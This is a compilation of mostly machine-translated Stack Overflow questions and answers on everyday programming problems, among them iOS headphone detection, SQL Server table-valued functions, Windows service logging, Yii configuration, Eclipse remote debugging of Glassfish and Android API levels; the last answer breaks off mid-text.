> 标签：ios, xcode, headphones

ios设备上有一部互动电影。当电影开始时（点击），视频开头的人会问你插入耳机，如果插入，那么视频应该自动跳转到故事（直接进入视频故事）。我应该怎么办？以及如何编写代码？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-21T13:04:22.183

首先，您必须注册 AudioRoute Changes ：-

```
AudioSessionAddPropertyListener (kAudioSessionProperty_AudioRouteChange,
                                     audioRouteChangeListenerCallback,
                                 self); 
```

在这里您可以描述更改路线的原因：-

```
CFDictionaryRef routeChangeDictionary = inPropertyValue;

  CFNumberRef routeChangeReasonRef =
  CFDictionaryGetValue (routeChangeDictionary,
                        CFSTR (kAudioSession_AudioRouteChangeKey_Reason));

  SInt32 routeChangeReason;

      CFNumberGetValue (routeChangeReasonRef, kCFNumberSInt32Type, &routeChangeReason);

  if (routeChangeReason == kAudioSessionRouteChangeReason_OldDeviceUnavailable) 
  {
       // your statements for headset unplugged

  }
  if (routeChangeReason == kAudioSessionRouteChangeReason_NewDeviceAvailable)
  {
       // your statements for headset plugged                             
  } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-13T20:42:06.187

这可能是另一种方式：

```
CFStringRef newRoute;
size = sizeof(CFStringRef);
XThrowIfError(AudioSessionGetProperty(kAudioSessionProperty_AudioRoute, &size, &newRoute), "couldn't get new audio route");
if (newRoute)
{
    CFShow(newRoute);
    if (CFStringCompare(newRoute, CFSTR("HeadsetInOut"), NULL) == kCFCompareEqualTo) // headset plugged in
          {
...
          }
    else if (CFStringCompare(newRoute, CFSTR("SpeakerAndMicrophone"), NULL) == kCFCompareEqualTo){
     ....
     }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-06-15T13:24:31.320

首先检查设备是否连接到任何耳机。

```
+(BOOL)isHeadsetPluggedIn {

AVAudioSessionRouteDescription* route = [[AVAudioSession sharedInstance] currentRoute];
for (AVAudioSessionPortDescription* desc in [route outputs]) {
    if ([[desc portType] isEqualToString:AVAudioSessionPortHeadphones])
        return YES;
}
return NO;
} 
```

然后根据bool值，写出自己的条件。像下面的东西..

```
if (isHeadphonesConnected) {
    //Write your own code here
}else{

} 
```

您还可以注册一个通知，以防您想知道当您在屏幕中时耳机是否被移除。

```
[[NSNotificationCenter defaultCenter] addObserver:self
                                         selector:@selector(audioRoutingListenerCallback:)
                                        name:AVAudioSessionRouteChangeNotification
                                           object:nil];

- (void)audioRoutingListenerCallback:(NSNotification*)notification
{
    NSDictionary *interuptionDict = notification.userInfo;

    NSInteger routeChangeReason = [[interuptionDict valueForKey:AVAudioSessionRouteChangeReasonKey] integerValue];

    switch (routeChangeReason) {

        case AVAudioSessionRouteChangeReasonNewDeviceAvailable:

            NSLog(@"Headphone/Line plugged in");

            /*Write your own condition.*/

            break;

        case AVAudioSessionRouteChangeReasonOldDeviceUnavailable:

            NSLog(@"Headphone/Line was pulled.");

            /*Write your own condition.*/                
            break;

        case AVAudioSessionRouteChangeReasonCategoryChange:
            // called at start - also when other audio wants to play

            break;
    }
} 
```

# sql - 如何在表值函数中使用条件联合 ALL？

> ID：10685320
> 
> 赞同：1
> 
> 时间：2012-05-21T12:31:29.963
> 
> 标签：sql, sql-server-2008

以下是内联表值函数

```
CREATE FUNCTION [dbo].[GetDipForDirectClientCharts]
(
  @FacilityId AS UNIQUEIDENTIFIER ,
  @PatientChartStatusCompleteEnum SMALLINT ,
  @PatientChartLockingInterval SMALLINT
)
RETURNS TABLE
AS RETURN
(            
    WITH    DirectPatientChartCTE
              --Get all patient charts that qualify for dip criteria   
              AS ( SELECT TOP 500
                            VisitNumber,PatientChartID
                   FROM     PatientChartCorporate WITH ( READPAST )
                   WHERE    PatientChartCorporate.IsDeleted = 0
                            AND PatientChartCorporate.IsErroneous = 0
                            AND PatientChartCorporate.FacilityId = @FacilityId
                            AND ( DipFileName IS NULL
                                  OR DipFileName = ''
                                )
                            AND PatientChartCorporate.ChartStatusID = @PatientChartStatusCompleteEnum
                            AND DATEDIFF(MINUTE, CompletedOn, GETUTCDATE()) >= +CONVERT(VARCHAR(30), @PatientChartLockingInterval)
                            AND ( PatientChartCorporate.CompletedOn IS NOT NULL )
                 ),
            RemotePatientChartCTE
              AS ( SELECT TOP 500
                            VisitNumber,PatientChartID
                   FROM     PatientCharts WITH ( READPAST )
                   WHERE    PatientCharts.IsDeleted = 0
                            AND PatientCharts.IsErroneous = 0
                            AND PatientCharts.FacilityId = @FacilityId
                            AND ( DipFileName IS NULL
                                  OR DipFileName = ''
                                )
                            AND PatientCharts.ChartStatusID = @PatientChartStatusCompleteEnum
                            AND DATEDIFF(MINUTE, CompletedOn, GETUTCDATE()) >= +CONVERT(VARCHAR(30), @PatientChartLockingInterval)
                            AND ( PatientCharts.CompletedOn IS NOT NULL )
                 )
SELECT  PatientCharts.VisitNumber ,
        PatientChartImages.ImageSequence AS ImageSequence
FROM    dbo.PatientChartImagesCorporate AS PatientChartImages WITH ( READPAST )
        INNER JOIN DirectPatientChartCTE AS PatientCharts ON PatientChartImages.PatientChartId = PatientCharts.PatientChartId
WHERE   Patientchartimages.OnbasedDate IS NULL
UNION ALL
( SELECT    PatientCharts.VisitNumber ,
            PatientChartImages.ImageSequence AS ImageSequence
  FROM      dbo.PatientChartImages AS PatientChartImages WITH ( READPAST )
            INNER JOIN RemotePatientChartCTE AS PatientCharts ON PatientChartImages.PatientChartId = PatientCharts.PatientChartId
  WHERE     Patientchartimages.OnbasedDate IS NULL
)
   ) 
```

我已经定义了两个 CTE`DirectPatientChartCTE`和`RemotePatientChartCTE`. 我不想使用 union all 以防`RemotePatientChartCTE`.

我知道我可以在 union all 下面的查询中使用 where 子句来检查 CTE 中的 0 条记录。在这种情况下，还将评估第二个查询。如果记录不存在，我不希望扫描第二个查询中的表。

这已经从视图更改为内联 TVF，因为视图的性能很糟糕。我不能使用 SP，因为我必须用这个 TVF 的结果填充动态临时表。请建议。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-21T12:40:30.257

你可以把你的函数变成一个多语句表值函数。一次执行一个 CTE 中的查询，并将每个查询的结果存储在一个表变量中。然后，您可以检查第二个表变量中的行数，并在必要时进行联合查询。

在这样的伪代码中。

```
declare @Direct table
(
  PatientChartID int primary key,
  VisitNumber int
)

declare @Remote table
(
  PatientChartID int primary key,
  VisitNumber int
)

insert into @Direct 
select top 500 VisitNumber,PatientChartID
from PatientChartCorporate
--where ....

insert into @Remote
select top 500 VisitNumber,PatientChartID
from PatientChartCorporate
--where ....

if exists(select * from @Remote)
begin
  -- union query here

end
else
begin
  -- non union query here

end 
```

# database - Get MSAccess version used to create MDB file

> ID：10685321
> 
> 赞同：4
> 
> 时间：2012-05-21T12:31:34.230
> 
> 标签：database, ms-access

I am looking for a way to get the version of MSAccess that was used to create a MDB file.

Any (tools, .bat, c#) suggestions appreciated.

Thanks

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-21T14:18:20.817

From VBA code, you could inspect the `FileFormat` property to determine the format version of your MDB file. It will return a value from the `Access.AcFileFormat` class.

I used this in the Immediate window with an MDB created as Access 2002-2003 format.

```
? CurrentProject.FileFormat = acFileFormatAccess2002 
True 
```

Notice however that doesn't say anything about the version of Access which was used to create the MDB. I created it using Access 2007:

```
? Access.Version
12.0 
```

As far as I'm aware, the version of Access used to create an MDB does not get stored anywhere within the MDB file. And you could create an MDB by another method, such as with VBScript, which doesn't require an Access application instance to be running or even require Access to be installed.

Perhaps if you give us more information about why you want to know which Access version was used to create your MDB, someone can offer a workaround.

# c++ - C++ 的潜在语义分析/索引库

> ID：10685324
> 
> 赞同：3
> 
> 时间：2012-05-21T12:31:39.263
> 
> 标签：c++, nlp, lsa

是否有用于 LSA/LSI 的 C++ 库？最好是 MIT, BSD, Apache,... 许可证 - 没有 GPL。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-22T08:42:51.987

David Blei 的页面上列出了几种潜在 Diriclet 分配 (LDA)、潜在语义分析 (LSA) 和主题建模的 C/C++ 实现。[http://www.cs.columbia.edu/~blei/topicmodeling.html](http://www.cs.columbia.edu/~blei/topicmodeling.html)以及 Berry 和 Dumai 的页面[http://web.eecs.utk.edu/research/lsi/](http://web.eecs.utk.edu/research/lsi/)

**以下是 C/C++ 实现的简短列表：**

*   `lda-c`: D. Blei 的 LDA 变分推理实现。
*   `class-slda`: C. Wang 对分类响应的监督主题模型的实现。
*   `hdp`: C. Wang 的分层狄利克雷过程的实现
*   `Gibbs Sampling`: Phan 和 Nguyen 使用 Gibbs 采样实现 LDA - `PHP LSA`: [http://sourceforge.net/projects/phplsa/](http://sourceforge.net/projects/phplsa/)
*   `lsa_prj`：[https ://github.com/matpalm/lsa/tree/master/lsa_prj](https://github.com/matpalm/lsa/tree/master/lsa_prj)

**如果您喜欢带有教程的 python 版本：** 请参阅[http://www.puffinwarellc.com/index.php/news-and-articles/articles/33-latent-semantic-analysis-tutorial.html?showall=1](http://www.puffinwarellc.com/index.php/news-and-articles/articles/33-latent-semantic-analysis-tutorial.html?showall=1)

# c# - 为什么我的 c# Windows 服务停止运行而没有任何消息写入应用程序事件日志？

> ID：10685333
> 
> 赞同：10
> 
> 时间：2012-05-21T12:32:43.990
> 
> 标签：c#, .net, .net-4.0, windows-services, windows-server-2003

我对 Windows 服务相当陌生。我为我的 c# Windows 服务创建了一个安装程序，并且服务器（Windows Server 2003）上的安装似乎已经工作。当它启动时，它会写入`Service started successfully`日志。当它停止时，它会写入`Service stopped successfully`. 但是，有时服务停止运行而没有向日志中写入任何内容，因此我手动启动它。当我之后查看日志时，它`Service started successfully`按预期显示。奇怪的是，在日志中连续两次看到它显然缺少服务以某种方式停止运行的条目。

这可能是什么潜在原因？我将服务设置为自动并安装它以供所有用户运行。我的印象是，这意味着只要机器启动，服务就会自动启动。我怎样才能找出它停止的原因？崩溃的服务是否会自动写入事件日志，或者我是否必须以记录自己的崩溃原因的方式处理异常？

**编辑：**一些附加信息：

*   我已将其设置为以本地系统帐户登录
*   在恢复选项下，我将其设置为在第一次失败时重新启动。我没有第二次或后续失败的任何东西。

**更新：**回答者推荐了一个全局异常处理程序。虽然我不会将此作为永久性修复来实施，但它至少可以帮助我找出问题发生在哪里。我实际上用我安装的服务对此进行了测试，它可以工作。我发现未处理的异常实际上确实使服务崩溃，而根本没有向日志中写入任何内容。我认为它至少会报告一些应用程序错误，但事实并非如此。

```
static void Main()
{
    AppDomain.CurrentDomain.UnhandledException += new UnhandledExceptionEventHandler(CurrentDomain_UnhandledException);

    //other code here
}

static void CurrentDomain_UnhandledException(object sender, UnhandledExceptionEventArgs e)
{
    Utilities.WriteIt(e.ExceptionObject as Exception);
} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-21T12:52:24.650

处理异常总是最好的。至少使用全局异常处理程序并将其写入日志文件

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-21T12:54:20.600

听起来您的服务在没有进行任何形式的异常处理和/或日志记录的情况下意外失败。Windows 服务不会自动将异常写入事件日志 - 由您来处理异常并（如果它们是致命的）将它们写出某个地方以便您可以诊断问题。

至少，我会在某个地方推荐一个日志文件（可能在服务可执行文件夹中，或者最好在其他容易访问且不会与权限问题发生冲突的地方）和所有异常处理程序的标准日志记录方法打电话给他们写消息。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-21T13:03:14.433

如果服务由于某些异常而意外退出，我不确定它是否会自动出现在事件日志中。

我强烈推荐使用[log4net 之](http://logging.apache.org/log4net/)类的日志套件来进行更彻底的日志记录。您将能够提供多种日志记录“级别”（调试跟踪以查看您是否到达某些代码、重要事件的信息跟踪、记录异常的错误跟踪）。

您可以[在此处](http://logging.apache.org/log4net/release/config-examples.html)查看 EventLogAppender 的示例。但是，我建议先获取 FileAppender，这是最容易创建的日志之一，首先工作，然后为 Event Log 添加第二个 appender。

# c# - 如何从我们的程序中动态地在我们的项目中添加新项目？

> ID：10685334
> 
> 赞同：0
> 
> 时间：2012-05-21T12:32:45.057
> 
> 标签：c#, asp.net

有什么方法可以从我们的程序中在我们的项目中添加新项目或现有项目？

例如：如果我需要从我的程序中添加 example.aspx 页面，那么如何添加它？它应该保存在解决方案资源管理器中。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-21T12:58:16.527

通常，您会使用类似于 CMS 的工作流程，您可以在其中设置主布局，然后以管理方式将内容添加到您想要的页面的每个部分。

以一种简单的方式，您可以使用 2 个文本框和一个提交按钮轻松创建页面：

```
<input type="text" id="txtFileName" />
<textarea id="txtContent" rows="80" cols="12"></textarea>
<input type="submit" id="btnSave" value="Save File" /> 
```

并让您的代码使用传递的内容创建一个新的文本文件，例如：

```
// create a writer and open the file
using (TextWriter tw = new StreamWriter(
                                 txtFileName.Text, 
                                 false, 
                                 System.Text.Encoding.UTF8))
{
    // write the content
    tw.Write(txtContent.Text);

    // close the stream
    tw.Close();
} 
```

您可以显示所有文件的列表并以相同的方式阅读它们，因此您可以编辑它们...

**现在**，在 ASP.NET 中，这可能无法正常工作，因为服务器需要再次编译，为此您还需要更改项目文件，但您可以运行发出编译行的本地脚本，然后重新编译一切为了您。

试一试，当您想出一些塞子时，请告诉我们，我们可能会帮助您...

# php - 在 yii 中，为什么我不能使用 yii::app()->getParams() 方法获取所有参数？

> ID：10685335
> 
> 赞同：-2
> 
> 时间：2012-05-21T12:32:46.183
> 
> 标签：php, yii

在我的程序中，我调用了getParams()方法，但只有10个参数。在我的main.php配置文件中，还有更多，为什么？这是 main.php 的参数部分

```
 'params'=>array(

    'adminEmail'=>'webmaster@example.com',
    'AccountDB' => 'db_account_dev',
    'orderDB' => 'db_order_dev',
'staticPath'=>dirname(__FILE__).DIRECTORY_SEPARATOR.'..'.DIRECTORY_SEPARATOR . '..' . DIRECTORY_SEPARATOR,
    'commonDB' => 'db_common',
    'payDB' => 'db_pay_dev',
    'crmDB' => 'db_crm_dev',
    'queue' => array(
        'email' => array(
            array(
                'host' => '127.0.0.1',
                'port' => 11300,
            ),
        ),
        'sms' => array(
            array(
                'host' => '127.0.0.1',
                'port' => 11330,
            ),
        ),
        'sale_record' => array(
            array(
                 'host' => '192.168.0.201',
                 'port' => 11300,
            ),
        ),
    ),
    'discuz' => array(
        'DBName'    => 'db_ultrax',
        'TablePrefix'  => 'pre_',
        'authKey'   => '00fefan5JEvKdiEQ',
    ),
    'freight' => require_once(dirname(__FILE__) . DIRECTORY_SEPARATOR . 'freight.php'),
    'allowCheckTaskSubId' => 224,
    'allowCheckEmail' => 242,
    'allowCheckPass' => 243,
    'codFee' => 10,
    'cancelFee' => 10, 
```

)

但是，该方法只返回一些项目

1.  adminEmail=>webmaster@example.com
2.  orderDB=>db_order_dev
3.  payDB=>db_pay
4.  AccountDB=>db_account
5.  commonDB=>db_common
6.  货运=>数组
7.  码费=>10
8.  saleRoleId=>9
9.  销售经理=>11
10.  增长=>数组

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-22T05:44:21.473

我得到了答案。控制台应用程序的配置文件是protected/config/console.php 而Web 应用程序的配置文件是protected/config/main.php 它们是不同的！来自控制台应用程序的上述代码

# mongodb - 从集合中删除特定文档

> ID：10685339
> 
> 赞同：1
> 
> 时间：2012-05-21T12:32:55.607
> 
> 标签：mongodb, mongovue

有没有办法使用 GUI 从集合中删除或删除文档？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T12:38:32.447

在 MongoVue 中，您可以删除`TreeView`. 只需右键单击文档并选择`Remove`:-)

# sql - 在sql中将月值与日值连接起来

> ID：10685348
> 
> 赞同：2
> 
> 时间：2012-05-21T12:33:26.133
> 
> 标签：sql, sql-server, date, join

我在一张表中有每日值，在另一张表中有每月值。我需要使用每月表的值并每天计算它们。

基本上，每月因素 * 每日因素 - 每一天

谢谢！

我有一张这样的桌子：

```
2010-12-31 00:00:00.000 28.3
2010-09-30 00:00:00.000 64.1
2010-06-30 00:00:00.000 66.15
2010-03-31 00:00:00.000 12.54 
```

和这样的表：

```
2010-12-31 00:00:00.000 98.1
2010-12-30 00:00:00.000 97.61
2010-12-29 00:00:00.000 99.03
2010-12-28 00:00:00.000 97.7
2010-12-27 00:00:00.000 96.87
2010-12-23 00:00:00.000 97.44
2010-12-22 00:00:00.000 97.76
2010-12-21 00:00:00.000 96.63
2010-12-20 00:00:00.000 95.47
2010-12-17 00:00:00.000 95.2
2010-12-16 00:00:00.000 94.84
2010-12-15 00:00:00.000 94.8
2010-12-14 00:00:00.000 94.1
2010-12-13 00:00:00.000 93.88
2010-12-10 00:00:00.000 93.04
2010-12-09 00:00:00.000 91.07
2010-12-08 00:00:00.000 90.89
2010-12-07 00:00:00.000 92.72
2010-12-06 00:00:00.000 93.05
2010-12-03 00:00:00.000 91.74
2010-12-02 00:00:00.000 90.74
2010-12-01 00:00:00.000 90.25 
```

我需要获取该季度的价值并将该季度的所有天数乘以每日价值

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-21T12:39:44.583

你可以试试：

```
SELECT dt.day, dt.factor*mt.factor AS daily_factor
FROM daily_table dt INNER JOIN month_table mt
    ON YEAR(dt.day) = YEAR(mt.day)
   AND FLOOR((MONTH(dt.day)-1)/3) = FLOOR((MONTH(mt.day)-1)/3)
ORDER BY dt.day 
```

或（如@Andriy 建议的那样）

```
SELECT dt.day, dt.factor*mt.factor AS daily_factor
FROM daily_table dt INNER JOIN month_table mt
    ON YEAR(dt.day) = YEAR(mt.day)
   AND DATEPART(QUARTER, dt.day) = DATEPART(QUARTER, mt.day)
ORDER BY dt.day 
```

# java - 使用 JAX-RS 定义自定义参数类型以按标识符返回数据

> ID：10685349
> 
> 赞同：0
> 
> 时间：2012-05-21T12:33:26.187
> 
> 标签：java, jersey, jax-rs

我是泽西岛的新手，我发现我们可以定义自己的参数类型来处理字符串以外的其他类型，例如日期或布尔值。

我将使用 ORM 将数据存储在数据库中，这样我就能够将标识符映射到类的实例，假设是用户。

定义一个参数类来处理参数中给定的用户 ID（例如路径或查询）并返回与该 ID 对应的 User 实例是一个好习惯吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T12:55:33.827

如果您的参数可以直接映射到原始类型，则无需定义您自己的参数。听起来您想接受一个用户 ID 作为参数，它可能是`long`,`int`或`String`. 所有这些都是自动映射的。

例如;

```
@Path("/")
public class UserService {

  @GET
  @Produces(MediaType.APPLICATION_XML)
  @Path("/{id}")
  public User getUser(@PathParam("id") String id) {
    //Your implementation here
  }

} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-21T12:50:32.530

好吧，让我们举个例子：

```
stackoverflow.com/users/1235336/ 
```

这里我们有其中 usedId 的路径。如果我们继续链接（执行`GET`请求），我们将得到一些用户实体作为响应。

因此，将用户 ID 定义为路径参数并返回一些用户实例是一种正常的做法。

# asp.net - 警告，ASP.Net 中的页面过期页面

> ID：10685351
> 
> 赞同：2
> 
> 时间：2012-05-21T12:33:40.110
> 
> 标签：asp.net

我想通过不返回以前的页面来保护用户，考虑银行网站中的前任，如果我们单击“返回”按钮，它会显示“警告页面已过期”页面。

在 Asp.Net 中，如何做到这一点。

我尝试了以下选项，但它不起作用。

选项1：-

```
<meta http-equiv="expires" content="0" /> 
```

选项 2：-

```
<meta http-equiv="PRAGMA" content="NO-CACHE" /> 
```

选项 3：- 在 Page_Load()

```
Response.Cache.SetCacheability(HttpCacheability.NoCache); 
        Response.Cache.SetNoStore();
        Response.Cache.SetExpires(DateTime.Now.AddMinutes(-1)); 
```

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-21T12:51:06.297

在您的解决方案中编辑以下行：

```
Response.Cache.SetCacheability(HttpCacheability.ServerAndNoCache) 
```

# plone - ZMI 中 portal_types 工具中的别名选项卡

> ID：10685355
> 
> 赞同：1
> 
> 时间：2012-05-21T12:33:52.593
> 
> 标签：plone, zope, dexterity

当我注意到 ZMI 中的 portal_types 工具中的别名选项卡时，我正试图调试与我的站点无关的问题。如果我尝试在使用灵巧的 Plone 4.1.5 站点中访问它，我没有得到任何响应。记录以下错误：

```
Traceback (innermost last):
 Module ZPublisher.Publish, line 126, in publish
 Module ZPublisher.mapply, line 77, in mapply
 Module ZPublisher.Publish, line 46, in call_object
 Module Shared.DC.Scripts.Bindings, line 322, in __call__
 Module Shared.DC.Scripts.Bindings, line 359, in _bindAndExec
 Module Products.PageTemplates.PageTemplateFile, line 130, in _exec
 Module Products.PageTemplates.PageTemplate, line 79, in pt_render
 Module zope.pagetemplate.pagetemplate, line 126, in pt_render
  - Warning: Compilation failed
  - Warning: exceptions.SyntaxError: invalid syntax (4c47ca874ec06dbf9207ed3a51ff9bb29425ee06.py, line 4)
PTRuntimeError: ['Compilation failed', 'exceptions.SyntaxError: invalid syntax (4c47ca874ec06dbf9207ed3a51ff9bb29425ee06.py, line 4)'] 
```

它适用于我照顾的一个单独的 Plone 3.3.6 站点。

Plone 4.1 是否仍支持此视图？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-24T06:59:02.483

正如vangeem所说，这是一个变色龙问题

[https://github.com/malthe/chameleon/issues/114](https://github.com/malthe/chameleon/issues/114)

# android - 将android项目导入Eclipse：无法编译

> ID：10685357
> 
> 赞同：0
> 
> 时间：2012-05-21T12:33:58.363
> 
> 标签：android, eclipse, compiler-errors

我已经将一个项目导入 Eclipse。API 的版本是 15 并且编译成功，但我需要第 7 版，因为在我的手机上无法更新操作系统。将 Android API 的版本更改为旧版本（第 7 版）后，我无法编译项目，出现以下错误：

```
import android.hardware.usb.UsbConstants;
import android.hardware.usb.UsbDevice;
import android.hardware.usb.UsbDeviceConnection;
import android.hardware.usb.UsbEndpoint;
import android.hardware.usb.UsbInterface;
import android.hardware.usb.UsbManager; 
```

它说 R 不能解析为变量：

```
setContentView(R.layout.main); 
```

在 main.xml

```
android:layout_width="match_parent" 
```

它说：不允许字符串类型（在'layout_width'，值为'match_parent'）。

是否可以解决此错误，但仍使用旧 API 版本？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T12:38:01.537

您必须使用最新的 Android Api 编译您的项目。项目属性 -> Android -> Android 4.0

在清单中，您可以设置

```
<uses-sdk android:minSdkVersion="7" /> 
```

如果您没有使用任何库或新功能，它应该可以工作。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-21T12:48:24.837

如果您需要 USB 功能：不。它从[API 级别 12](http://developer.android.com/reference/android/hardware/usb/UsbManager.html)开始存在。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-21T12:37:53.197

从平台文件夹中添加 API 15 的 Jar 并包含在 Android MAnifesh 作为 Android minsdk 作为 9 和 target sdk 作为 15 然后我希望你的应用程序能够运行

# c# - OpenXml：以编程方式获取脚注的 NumberingRestart 设置

> ID：10685359
> 
> 赞同：2
> 
> 时间：2012-05-21T12:34:11.570
> 
> 标签：c#, openxml

脚注有编号重新启动选项。编号可以从以下位置重新开始：页、节或可以是连续的。

如何以编程方式获取现有 docx 文档脚注的编号重新启动设置。

谢谢你的建议。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-21T18:36:10.407

文档范围的脚注设置可以在`DocumentSettingsPart`. OpenXml SDK 中的相关类称为`FootnoteDocumentWideProperties`.

下面的示例读取用户配置的脚注编号重启设置：

```
public static void ReadFootnoteNumberingRestartSettings()
{
  using (WordprocessingDocument wordDoc = 
         WordprocessingDocument.Open(@"c:\temp\Doc1.docx", true)) 
  {
    FootnoteDocumentWideProperties fdwp = 
             wordDoc.MainDocumentPart.DocumentSettingsPart.Settings.Elements<FootnoteDocumentWideProperties>().FirstOrDefault();

    if (fdwp == null)
    {
      Console.Out.WriteLine("No document wide footnote settings specified.");
      return;
    }

    if (fdwp.NumberingRestart == null)
    {
      Console.Out.WriteLine("No numbering restart settings specified.");
      return;
    }

    Console.Out.WriteLine("Numbering restart option: {0}", fdwp.NumberingRestart.Val);    
  }
}

static void Main(string[] args)
{
  ReadFootnoteNumberingRestartSettings();
} 
```

# java - Eclipse 跳过断点

> ID：10685361
> 
> 赞同：7
> 
> 时间：2012-05-21T12:34:27.670
> 
> 标签：java, eclipse, debugging

我的问题不是一个新问题，我发现了几个关于它的线程，但没有一个对我有帮助。我希望这个会。

我无法使用 Eclipse 进行调试。它识别断点，切换到调试视图，但不知何故它不同步，我无法调试我的代码。有时它会起作用，但过一段时间它会再次发生。

我使用 JDK 1.6.0_24、Glassfish 3.1、eclipse INDIGO（但它也发生在 HELIOS 上）。

我尝试（正如我在这个站点中发现的那样）将 eclipse 设置为使用 Parallel GC。我尝试将其放入 eclipse.ini 文件中，尝试放入 glassfish VM 参数本身，并尝试将其放入 eclipse JDK 附加 VM 参数中（首选项 -> 安装的 JRE-> JDK -> 等）。似乎没有什么对我有用。我也一起尝试过。

请帮帮我..

提前谢谢大家，伊多

**编辑：**

好的，我注意到了更多的事情：

在 Debug 视图中，在我的 stck 跟踪中，我发现带有断点的确切类已暂停，并且它有这样的注释：“（在第 XX 行暂停断点）”。当我点击这条线时，突然出现了绿线。然而，当我点击 F6 继续时，它又不同步了，只是下一行被暂停了。奇怪的。

我检查了我电脑上运行的进程，发现有几个“java.exe”进程同时运行。（eclipse 在 javaw.exe 上运行）。也许这就是 glassfish 和 eclipse 拒绝合作的原因。

我检查了构建路径，发现这是我的输出文件夹：project-name/target/classes。这个好吗？

有什么想法吗？

我愿意

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-23T09:00:30.267

所以，我无法解决这个问题，但我找到了一个完全解决这个问题的解决方法——终于！

我刚刚停止使用 glassfish WTP 进行调试，并为我的本地 glassfish 设置了远程调试。它可以完美地处理一些小烦人的事情——但断点终于注意到了。

**设置远程调试**

1.  转到您的 glassfish 管理控制台并将您的 glassfish 设置为在调试模式下工作。
    单击配置 --> 服务器配置 --> JVM 设置，然后选中启用调试复选框。
    重启服务器

2.  在 Eclipse 中 - 在正常模式下启动服务器（不是调试 - 它没用）。

3.  转到调试配置并找到“远程 Java 应用程序”

4.  创建一个新的远程 java 应用程序调试配置

5.  输入名称（比如说 Glassfish-Debug）

6.  选择要调试的项目

7.  在主机部分输入**您自己的IP地址**并将端口设置为**9009**
    ![在此处输入图像描述](../Images/a7e8231f67aff9f54cc0a932ed342601.png)

8.  这是可选的，但使用起来更舒服：
    转到“通用”选项卡，然后选中“调试”复选框。
    这将使这个 Glassfish 远程调试配置在您的调试菜单上保持不变。
    ![在此处输入图像描述](../Images/172fd4d331a18beb1679a49f451f28b6.png)

就是这样。现在您所要做的就是始终以正常模式启动 Glassfish，然后转到调试配置并运行您刚刚设置的 Glassfish 远程调试。
![在此处输入图像描述](../Images/3d5033043c2d2751aa78c7b8fe15f0b4.png)

现在我开始烦人的部分：重建项目后，有时您可能会再次不同步。您只需要断开远程调试会话并再次运行它。付出的代价很小。

我希望它有帮助..

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-21T14:25:11.453

我遇到过类似的问题，但事实证明这是安装多个版本的 JRE/JDK 的更简单的问题。

尝试调试 -> 运行配置 -> JRE -> 备用 JRE -> 选择 JDK 1.6.0_24。

如果使用了正确的 Jar，还要检查项目构建路径。

希望这可以帮助。

# java - 网页和小程序的恒定会话 ID

> ID：10685362
> 
> 赞同：1
> 
> 时间：2012-05-21T12:34:29.737
> 
> 标签：java, session, applet

我有一个与客户端的小程序交互的 Web 应用程序。在服务器上，我存储对 {sessionid->user} 用于身份验证。这意味着来自用户的每个请求每次都必须具有相同的 sessionid。问题是我的应用程序中需要小程序。来自这个小程序的请求会初始化新会话并因此产生新的会话 ID（我认为是因为 request.getSession(false) 返回 null。我错了吗？）。问题是：如何让小程序使用相同的会话，或者如何使用 javasript 检索当前会话 ID？在这种情况下，我可以将它作为参数传递给小程序。document.cookie 和 url 地址都不包含“jsessionid”或类似的东西。PS：应用程序在tomcat上运行良好。但现在它移到了 weblogic 上。

# lua - 碰撞时跳跃物体

> ID：10685369
> 
> 赞同：3
> 
> 时间：2012-05-21T12:35:13.947
> 
> 标签：lua, coronasdk

我正在尝试实现一个可以反弹落在其上的物体的条。但是我只希望物体从顶部边缘上方落到它上面时反弹。如果对象来自波纹管，则对象应该像条不存在一样通过。这类似于小鸟在 tweetjump 或 doodle 在 doodle jump 中所做的事情。关于我如何在电晕中做到这一点的任何提示？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-21T12:51:21.490

当物体从下方与杆碰撞时，尝试给予

```
bar.isSensor = true 
```

在这里阅读：http: [//developer.anscamobile.com/reference/index/bodyissensor](http://developer.anscamobile.com/reference/index/bodyissensor)

> 设置此属性的一个用例是覆盖即将发生的碰撞，例如“单侧平台”情况，其中角色应仅在一个方向通过平台。

# ios - iPhone删除消息之类的界面

> ID：10685371
> 
> 赞同：-1
> 
> 时间：2012-05-21T12:35:18.940
> 
> 标签：ios, ios5, uitableview, imessage

我想删除 UITableView 中的行，我需要提供删除按钮，而不是通过滑动，而是以类似于 iPhone 中的删除消息功能的方式提供。在其中单击编辑时，单元格左侧会出现一个红色小圆圈，单击时会旋转并显示删除按钮。如何实施？

如下图所示：

![在此处输入图像描述](../Images/b4a8d488ee84b69b401d9fb48d94ae69.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-21T12:42:35.863

有关如何实现此目的的详细信息，请参阅[此处](http://developer.apple.com/library/ios/#documentation/uikit/reference/UITableView_Class/Reference/Reference.html)的 Apple 文档。尤其是：

